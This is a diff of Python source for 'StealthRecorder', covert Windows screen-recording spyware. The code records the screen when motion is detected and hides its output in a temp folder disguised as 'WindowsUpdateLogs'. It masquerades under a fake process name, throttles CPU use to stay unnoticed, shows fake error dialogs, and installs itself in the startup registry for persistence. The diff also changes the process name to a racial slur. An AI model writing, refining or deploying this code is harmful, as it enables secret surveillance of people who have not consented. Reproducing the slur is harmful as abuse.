@@ -23,21 +23,18 @@ import win32con
 import win32api
 
 # ===== CONFIGURATION =====
-
-# ===== OPTIMIZED CONFIGURATION =====
-RECORD_FPS = 30  # Balanced between smoothness and performance
-RECORD_RESOLUTION = (1280, 720)  # HD resolution
-MIN_MOTION_THRESHOLD = 800  # Higher = less sensitive to small changes
-MAX_RECORD_SECONDS = 60 * 60 * 8  # 8 hours max per session
-MAX_CPU_PERCENT = 15.0  # Slightly higher for smoothness
-MEMORY_BUFFER_SIZE = 30  # Smaller buffer for real-time feel
-ENABLE_ENCRYPTION = True  # Set to False to disable encryption
-PROCESS_NAME = "WindowsUtittySvc.exe"  # Name to appear in Task Manager
+RECORD_FPS = 3
+RECORD_RESOLUTION = (1024, 768)
+MIN_MOTION_THRESHOLD = 750
+MAX_RECORD_SECONDS = 60 * 60 * 8
+OUTPUT_FOLDER = os.path.join(os.environ['TEMP'], 'WindowsUpdateLogs')
 ENCRYPTION_KEY = Fernet.generate_key()
-print(f'{ENCRYPTION_KEY=}') 
-
-# ==================================
-
+print(ENCRYPTION_KEY)
+MAX_CPU_PERCENT = 4.0
+MEMORY_BUFFER_SIZE = 100
+ENABLE_ENCRYPTION = True  # Set to False to disable encryption
+PROCESS_NAME = "NiggerreggiN.exe"  # Name to appear in Task Manager
+# =========================
 
 class StealthRecorder:
     def __init__(self):
@@ -245,92 +242,82 @@ class StealthRecorder:
         
         return changed_pixels > MIN_MOTION_THRESHOLD
 
-    # Add these to your capture_frame() method:
     def capture_frame(self):
-        """Optimized screen capture"""
+        """Capture a single screen frame using MSS"""
         try:
-            # Use fastest MSS capture mode
-            screenshot = self.sct.grab({
-                'left': 0, 
-                'top': 0,
-                'width': 1920,  # Your screen width
-                'height': 1080   # Your screen height
-            })
+            # Capture entire screen
+            monitor = self.sct.monitors[1]
+            screenshot = self.sct.grab(monitor)
             
-            # Fast resize using INTER_AREA (best for downscaling)
-            frame = cv2.resize(
-                np.array(screenshot), 
-                RECORD_RESOLUTION,
-                interpolation=cv2.INTER_AREA
-            )
-            
-            # Convert color space efficiently
-            return cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+            # Convert to numpy array and process
+            frame = np.array(screenshot)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+            return cv2.resize(frame, RECORD_RESOLUTION)
         except Exception as e:
             print(f"Capture error: {e}")
             return None
 
-        def buffer_frame(self, frame):
-            """Buffer frames in memory and periodically write to disk"""
-            self.frame_buffer.append(frame)
-            
-            # Write to disk if buffer full or 30 seconds passed
-            current_time = time.time()
-            if len(self.frame_buffer) >= MEMORY_BUFFER_SIZE or (current_time - self.last_write_time) > 30:
-                for buffered_frame in self.frame_buffer:
-                    self.video_writer.write(buffered_frame)
-                self.frame_buffer = []
-                self.last_write_time = current_time
+    def buffer_frame(self, frame):
+        """Buffer frames in memory and periodically write to disk"""
+        self.frame_buffer.append(frame)
+        
+        # Write to disk if buffer full or 30 seconds passed
+        current_time = time.time()
+        if len(self.frame_buffer) >= MEMORY_BUFFER_SIZE or (current_time - self.last_write_time) > 30:
+            for buffered_frame in self.frame_buffer:
+                self.video_writer.write(buffered_frame)
+            self.frame_buffer = []
+            self.last_write_time = current_time
 
-        def run(self):
-            """Main recording loop with stealth enhancements"""
-            print(f"Process ID: {self.process_id} running as {PROCESS_NAME}")
-            print(f"Encryption: {'ENABLED' if ENABLE_ENCRYPTION else 'DISABLED'}")
-            
-            last_motion_time = time.time()
-            
-            while True:
-                try:
-                    # CPU throttling
-                    self.limit_cpu_usage()
+    def run(self):
+        """Main recording loop with stealth enhancements"""
+        print(f"Process ID: {self.process_id} running as {PROCESS_NAME}")
+        print(f"Encryption: {'ENABLED' if ENABLE_ENCRYPTION else 'DISABLED'}")
+        
+        last_motion_time = time.time()
+        
+        while True:
+            try:
+                # CPU throttling
+                self.limit_cpu_usage()
+                
+                frame = self.capture_frame()
+                if frame is None:
+                    time.sleep(1)
+                    continue
+                
+                motion_detected = self.detect_motion(frame)
+                
+                # Start recording on motion
+                if not self.recording_active and motion_detected:
+                    if self.start_recording():
+                        print(f"Recording started: {self.current_video_file}")
+                        last_motion_time = time.time()
+                
+                # Maintain recording while motion continues
+                if self.recording_active:
+                    if motion_detected:
+                        last_motion_time = time.time()
                     
-                    frame = self.capture_frame()
-                    if frame is None:
-                        time.sleep(1)
-                        continue
+                    # Buffer frame instead of writing immediately
+                    self.buffer_frame(frame)
                     
-                    motion_detected = self.detect_motion(frame)
-                    
-                    # Start recording on motion
-                    if not self.recording_active and motion_detected:
-                        if self.start_recording():
-                            print(f"Recording started: {self.current_video_file}")
-                            last_motion_time = time.time()
-                    
-                    # Maintain recording while motion continues
-                    if self.recording_active:
-                        if motion_detected:
-                            last_motion_time = time.time()
-                        
-                        # Buffer frame instead of writing immediately
-                        self.buffer_frame(frame)
-                        
-                        # Stop recording if no motion for 60 seconds or max time reached
-                        current_time = time.time()
-                        if (current_time - last_motion_time) > 60 or (current_time - self.start_time) > MAX_RECORD_SECONDS:
-                            self.stop_recording()
-                            print(f"Recording stopped: {self.current_video_file}")
-                            self.last_frame = None  # Reset motion detection
-                    
-                except KeyboardInterrupt:
-                    if self.recording_active:
+                    # Stop recording if no motion for 60 seconds or max time reached
+                    current_time = time.time()
+                    if (current_time - last_motion_time) > 60 or (current_time - self.start_time) > MAX_RECORD_SECONDS:
                         self.stop_recording()
-                    break
-                except Exception as e:
-                    if "out of memory" in str(e).lower() or "access denied" in str(e).lower():
-                        self.show_fake_error()
-                    print(f"Unexpected error: {e}")
-                    time.sleep(5)
+                        print(f"Recording stopped: {self.current_video_file}")
+                        self.last_frame = None  # Reset motion detection
+                
+            except KeyboardInterrupt:
+                if self.recording_active:
+                    self.stop_recording()
+                break
+            except Exception as e:
+                if "out of memory" in str(e).lower() or "access denied" in str(e).lower():
+                    self.show_fake_error()
+                print(f"Unexpected error: {e}")
+                time.sleep(5)
 
 def install_persistence():
     """Add to Windows startup registry"""
@@ -416,4 +403,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
